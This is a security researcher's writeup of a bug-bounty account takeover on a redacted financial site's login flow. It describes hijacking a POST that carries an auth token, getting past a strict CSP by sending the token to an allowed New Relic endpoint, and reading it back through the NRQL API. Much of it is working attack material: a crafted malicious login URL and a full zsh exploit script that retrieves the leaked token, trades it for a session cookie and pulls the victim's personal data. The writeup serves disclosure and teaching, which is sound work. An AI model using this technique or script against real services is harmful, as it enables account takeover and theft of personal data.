---
layout: post
title: Bypassing CSP with New Relic Custom Events
author: Justin Gardner
date: 2025-10-31
tags: [csp, auth-token, ato, post-request-hijack]
profile_picture: /assets/images/Rhyno.jpg
handle: Rhynorater
social_links: [https://x.com/rhynorater, https://rhynorater.github.io]
description: "One of my favorite bugs I've ever found because of the sheer volume of unexpected solutions to chain-ending problems. The end result was an ATO!"
permalink: /writeups/bypassing-csp-new-relic-custom-events-cspt
---

This writeup outlines one of my favorite bugs I've ever found because of the sheer volume of unexpected solutions to chain-ending problems. The end result is ATO, and this was achieved by:
1. Hijacking the destination of a POST request with sensitive JSON body
2. CSP was tight, so could only hit target domain or Sentry or New Relic
3. Pointed POST Request at New Relic & finessed authentication into my own New Relic Tenent
4. Fetched the POST body from the New Relic Error logs via the NRQL API
5. Swapped token for session cookie and achieved ATO

Allow me to elaborate...


## TLDR / Takeaways

In strong CSP environments where you can hijack a POST-based, JSON fetch request, you can utilize New Relic's `NrIntegrationError` object in the NRQL API to query arbitrary JSON sent to your New Relic URL to leak data out.

Via hijacked `fetch` request:
```http
POST /v1/accounts/1337/events;Api-Key=YOUR_API_KEY HTTP/1.1
Host: bam.eu01.nr-data.net
Content-Type: application/json

{"YOUR_RAW_JSON_DATA":"BUT THE LENGTH IS CAPPED AT 100 CHARS WHEN RETRIEVING THE DATA"}
```
Resp:
```http
HTTP/1.1 200 
Connection: close
Content-Length: 63
content-type: text/json; charset=utf-8
nr-rate-limited: allowed
access-control-allow-methods: GET, POST, PUT, HEAD, OPTIONS
access-control-allow-credentials: true
access-control-allow-origin: https://redacted.com
x-served-by: cache-ewr-kewr1740024-EWR
date: Thu, 02 Oct 2025 21:06:10 GMT

{"success":true, "uuid":"57aa1df8-0001-bf20-8b48-0199a6bf2d7c"}
```

Then, the attacker can do the following from their machine:

```bash
curl -s -X POST 'https://api.eu.newrelic.com/graphql' \
    -H 'Content-Type: application/json' \
    -H 'Api-Key: {YOUR_NEW_RELIC_USER_API_KEY}' \
    --data-raw '{"query":"{ actor { account(id: 1337) { nrql(query: \"SELECT payloadSample FROM NrIntegrationError LIMIT 1\") { results } } } }"}'
```
Result:
```json
{
    "data": {
        "actor": {
            "account": {
                "nrql": {
                    "results": [{
                        "payloadSample": "{\"YOUR_RAW_JSON_DATA\":\"BUT THE LENGTH IS CAPPED AT 100 CHARS",
                        "timestamp": 1759439170940
                    }]
                }
            }
        }
    }
}
```

## The Vuln

This vulnerability occured in the login flow of of a sensitive financial application. 

The authentication URLs for this domain look like this:
```
https://auth.redacted.com/login?realm=%2Fcustomers&goto=https%3A%2F%2Facc-data.redacted.com%2Fweb-authorize%3Fresponse_type%3Dcode%26client_id%3DclientIdForFinancial%26redirect_uri%3Dhttps%3A%2F%2Facc-data.redacted.com%2Fauth%2Fcallback%26scope%3Dopenid%2520iid%2520uci%2520profile%2520card.account&channel=channel&successMessage=false
```

The `goto` parameter controls where the `idsToken` will be sent in the following JS:
```js
  , KM = async (e, t, r, n) => {
    const i = new URLSearchParams(e)
      , {url: o} = In.get("wsLoginUrl");
    try {
        const a = new URL(i.get("goto"))
          , s = await ke.post("".concat(a.origin).concat(a.pathname), {
            idsToken: t,
            responseType: "code",
            clientId: a.searchParams.get("client_id"),
            scope: a.searchParams.get("scope"),
            redirectUri: a.searchParams.get("redirect_uri")
        }, {
            withCredentials: !0
        });
        window.location.href = GM(s.data.callbackURL)
    } catch (a) {
        if (r === "login") {
            const s = new URL("".concat(o, "authapp-error"));
            typeof n < "u" && n !== pe.SITE && s.searchParams.append("channel", ZM[n]),
            window.location.href = s.toString()
        } else
            i.append("successMessage", "true"),
            window.location = "/login?".concat(decodeURIComponent(i.toString()))
    }
}
```

Here we can see that the `idsToken` is sent via a POST HTTP request to the attacker defined `a.origin` and `a.pathname` which originated from `i.get("goto")` which was pulled from `const i = new URLSearchParams(e)`, where `e` is `window.location.href` from the previous function in the call stack.

This is deceptively simple, and it looks like you could simply insert an attacker domain in the `goto` parameter and you'd be good to go. However, there is a problem:
```
connect-src: https://auth-data.redacted.com, https://acc-data.redacted.com, 'self', https://bam.eu01.nr-data.net, https://o40991.ingest.sentry.io, https://acc-auth.redacted.com
```
The CSP's connect-src was extremely strict - allowing only a few domains, `bam.eu01.nr-data.net` and `o40991.ingest.sentry.io`.

This begged the question: `Is it possible to send arbitrary data to one of these two hosts and retrieve it via the UI?`

I thought the chances of this were pretty good given the fact that these companies (New Relic and Sentry) both specialize gathering data - so it was feasible that they might be logging arbitrary data sent to endpoints. I started with sentry, but quickly hit a wall. I then pivoted to New Relic.

In New Relic, it is possible to create [custom events](https://docs.newrelic.com/docs/data-apis/ingest-apis/event-api/introduction-event-api/):

However, the location one is supposed to send these custom events to is different then the above `bam` url:
```
https://insights-collector.newrelic.com/v1/accounts/YOUR_ACCOUNT_ID/events
```

However, I tried the `/v1/accounts/YOUR_ACCOUNT_ID/events` path on `bam.eu01.nr-data.net` and it suspiciously didn't return a 404, it returned a 401. This lead me to believe that I could hit the API on this endpoint.

The next challenge came when I tried to sub in my test ACCOUNT_ID - 403 forbidden. I needed to authenticate - however, the docs said that this must be done via a HTTP Header that I didn't control:
```
gzip -c example_events.json | curl -X POST -H "Content-Type: application/json" \
-H "Api-Key: YOUR_LICENSE_KEY" -H "Content-Encoding: gzip" \
https://insights-collector.newrelic.com/v1/accounts/YOUR_ACCOUNT_ID/events --data-binary @-
```

Miraculously, there are other spots within the New Relic infrastructure that `Api-Key` could be used in the query parameter to authenticate. So, crafting the URL:
```
https://bam.eu01.nr-data.net/v1/accounts/1337/events?Api-Key=MY_API_KEY
```
Allowed me to send events to the `custom events` API in New Relic.

But, there is another catch - I didn't control query parameters. You remember from the code:
```js
        const a = new URL(i.get("goto"))
        , s = await ke.post("".concat(a.origin).concat(a.pathname), {
```
Only the `a.origin` and `a.pathname` are being passed. 

At this point I felt like it was a deadend. But, in a moment of optimism I tried:
```
https://bam.eu01.nr-data.net/v1/accounts/1337/events%3fApi-Key=MY_API_KEY
```
**AND IT WORKED.** Actually...
```
https://bam.eu01.nr-data.net/v1/accounts/1337/eventsApi-Key=MY_API_KEY
```
works too. I have no idea why - it is one of the weirdest things I've ever seen in my 15+ years of hacking.

But, using this, I was able to authenticate into the `custom events` API and get my POST request body ingested by New Relic. 

The request sent by the browser after authentication into the app looks like this:
```http
POST /v1/accounts/1337/eventsApi-Key=MY_API_KEY HTTP/1.1
Host: bam.eu01.nr-data.net
Connection: keep-alive
Content-Length: 298
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
Content-Type: application/json
sec-ch-ua-mobile: ?0
Origin: https://auth.redacted.com
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Sec-Fetch-Storage-Access: none
Referer: https://auth.redacted.com/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9

{"idsToken":"273h8N3KpHbiRBV8ew7cp4CSDI4.*AAJTSQACMTAAAlNLABxPRjFqb3RYMkRPTDRXdkhwb0FNS2FVVVIrV3c9AAR0eXBlAANDVFMAAlMxAAIwMQ..*","responseType":"code","clientId":"clientIdFinancial","scope":"openid iid uci profile card.account","redirectUri":"https://acc-data.redacted.com/auth/callback"}
```
and the response from New Relic came back:
```
HTTP/1.1 200 
Connection: close
Content-Length: 63
content-type: text/json; charset=utf-8
nr-rate-limited: allowed
access-control-allow-methods: GET, POST, PUT, HEAD, OPTIONS
access-control-allow-credentials: true
access-control-allow-origin: https://auth.redacted.com
x-served-by: cache-ewr-kewr1740024-EWR
date: Thu, 02 Oct 2025 21:06:10 GMT

{"success":true, "uuid":"57aa1df8-0001-bf20-8b48-0199a6bf2d7c"}

```

When I saw this, I was thrilled because I remembered this line of the docs:
> All successful submissions receive a 200 response, regardless of any data errors that may exist within the payload. The response includes a uuid, which is a unique ID created for each request. The uuid also appears in any error events created for the request.


Further down in [that documentation](https://docs.newrelic.com/docs/data-apis/ingest-apis/event-api/introduction-event-api/) we see a way to query malformed data being passed into New Relic:
> The NrIntegrationError event allows you to query and set alerts on custom data being sent to your New Relic account. Recommendation: To get alerts for parsing errors, create a NRQL alert condition for NrIntegrationError. Use this example NRQL query:
```sql
SELECT message FROM NrIntegrationError WHERE newRelicFeature = 'Event API' AND category = 'EventApiException'
```

After reading the docs thoroughly, I identified the following query which would allow me to retrieve the first 100 characters of the JSON data submited through this endpoint:
```sql
SELECT payloadSample FROM NrIntegrationError LIMIT 1
```
Which would return something like:
<img width="1717" height="297" alt="NewRelicPic1" src="https://gist.github.com/user-attachments/assets/bcb7521d-3c59-4da8-b1e7-bb4d5c92d905" />


and this would return the data leaked via the POST request. 

Unfortunately, the API only returns the first 100 characters of the payload. When I saw this, I was gutted, because the `idsToken` used to swap for the OAuth code was very long. 

However, this was one of those perfect "stars align" scenarios. 3 characters before the New Relic cut off, the rest of the string becomes predictable. As a result, I was still able to exploit this by appending:
```
R0eXBlAANDVFMAAlMxAAIwMw..*
```
or 
```
R0eXBlAANDVFMAAlMxAAIwMQ..*
```

This completed the leak chain. However, to swap this token for the true Oauth Code, I still needed the matching `w82S5XX1` cookie which was set when this `IdsToken` was generated. Luckily for me, this was impromperly implemented and any `w82S5XX1` code would work, so by simply hitting:
```bash
echo "[1] Fetching w82S5XX1..."
w8=$(curl -s "https://auth-data.redacted.com/submit"  -i | grep w82 | cut -f 2 -d "=" | cut -f 1 -d ";")
echo "Got w82S5XX1: $w8"
```
I was able to retrieve a `w82S5XX1` token which could be redeemed with the `idsToken` to get the coveted session token.


Here is the final exploit:
```bash
#!/usr/bin/zsh

echo "[1] Fetching w82S5XX1..."
w8=$(curl -s "https://auth-data.redacted.com/submit"  -i | grep w82 | cut -f 2 -d "=" | cut -f 1 -d ";")
echo "Got w82S5XX1: $w8"

echo "[2] Fetching latest leaked token..."
token=$(curl -s -X POST 'https://api.eu.newrelic.com/graphql' \
     -H 'Content-Type: application/json' \
     -H 'Api-Key: NRAK-SEX1I026RXXXXXXXXXXXXXXXX' \
     --data-raw '{"query":"{ actor { account(id: 1337) { nrql(query: \"SELECT payloadSample FROM NrIntegrationError LIMIT 1\") { results } } } }"}' |
	 cut -f 17 -d '"')


echo "Got Token: ${token}R0eXBlAANDVFMAAlMxAAIwMw..*"
echo "Appending R0eXBlAANDVFMAAlMxAAIwMw..* to token1 and R0eXBlAANDVFMAAlMxAAIwMQ..* to token2"
token1=$(echo -n "${token}R0eXBlAANDVFMAAlMxAAIwMw..*")
token2=$(echo -n "${token}R0eXBlAANDVFMAAlMxAAIwMQ..*")

echo "[3] Fetching oauth code..."
codetoken1=$(curl -s -k $'https://acc-data.redacted.com/web-authorize' -X $'POST' -H $'Host: acc-data.redacted.com' -H $'Connection: keep-alive' -H $'Content-Length: 298' -H $'sec-ch-ua-platform: "Windows"' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36' -H $'Accept: application/json, text/plain, */*' -H $'sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"' -H $'Content-Type: application/json' -H $'sec-ch-ua-mobile: ?0' -H $'Origin: https://auth.redacted.com' -H $'Sec-Fetch-Site: same-site' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://auth.redacted.com/' -H $'Accept-Encoding: gzip, deflate, br, zstd' -H $'Accept-Language: en-US,en;q=0.9,ja;q=0.8' --data '{"idsToken":"'$token1'","responseType":"code","clientId":"clientID","scope":"openid iid uci profile card.account","redirectUri":"https://acc-data.redacted.com/auth/callback"}' | cut -f 4 -d '"')
if [[ $codetoken1 == *"code="* ]]; then
	echo "Got code on first try, no need for token2..."
    codeurl=$(echo -n "$codetoken1")
else
	echo "Didn't get token on first try, let's try token2..."
	codetoken2=$(curl -s -k $'https://acc-data.redacted.com/web-authorize' -X $'POST' -H $'Host: acc-data.redacted.com' -H $'Connection: keep-alive' -H $'Content-Length: 298' -H $'sec-ch-ua-platform: "Windows"' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36' -H $'Accept: application/json, text/plain, */*' -H $'sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"' -H $'Content-Type: application/json' -H $'sec-ch-ua-mobile: ?0' -H $'Origin: https://auth.redacted.com' -H $'Sec-Fetch-Site: same-site' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://auth.redacted.com/' -H $'Accept-Encoding: gzip, deflate, br, zstd' -H $'Accept-Language: en-US,en;q=0.9,ja;q=0.8' --data '{"idsToken":"'$token2'","responseType":"code","clientId":"clientId","scope":"openid iid uci profile card.account","redirectUri":"https://acc-data.redacted.com/auth/callback"}' | cut -f 4 -d '"')
	codeurl=$(echo -n "$codetoken2")
fi

if [[ ! $codeurl == *"code="* ]]; then
	echo "Failed to fetch code..."
	exit 0
fi
echo "Got oauth code: $codeurl"

echo "[4] Fetching session cookie..."
cookie=$(curl -i -s $codeurl -H "Cookie: w82S5XX1=$w8" | grep "cid=" | cut -f 2 -d "=" | cut -f 1 -d ";")
echo "Got session cookie: cid=$cookie"

echo "[5] Exfiltrating PII..."
curl -s -H "Origin: https://creditcard.redacted.com" https://acc-data.redacted.com/profile -H "Cookie: cid=$cookie" | jq .

```

This exploit is used in conjunction with this URL:
```
https://auth.redacted.com/login?realm=%2Fcustomers&goto=https://bam.eu01.nr-data.net%2Fv1%2Faccounts%2F1337%2FeventsApi-Key%3Deu01xxREDACTEDFNRAL%26%3Fresponse_type%3Dcode%26client_id%3DclientIdFinancial%26redirect_uri%3Dhttps%3A%2F%2Facc-data.redacted.com%2Fauth%2Fcallback%26scope%3Dopenid%2520iid%2520uci%2520profile%2520card.account&channel=channelredacted&successMessage=false
```

When a victim visits the above URL and logs in, it will:
1. Leak the victim's `idTokens` to `bam.eu01.nr-data.net`

Then, the attacker (running `zsh ./exploit.sh`):
1. Retrieves the `idTokens` from New Relic via the NRQL API
2. Appends the possible endings
3. Fetches the valid `w82S5XX1`
4. Trades the `w82S5XX1` and `idTokens` for a session cookie (retrying if needed with token2)
5. Retrieves the victim's PII

GG.

There is always a way. Keep looking deeper.

-Rhynorater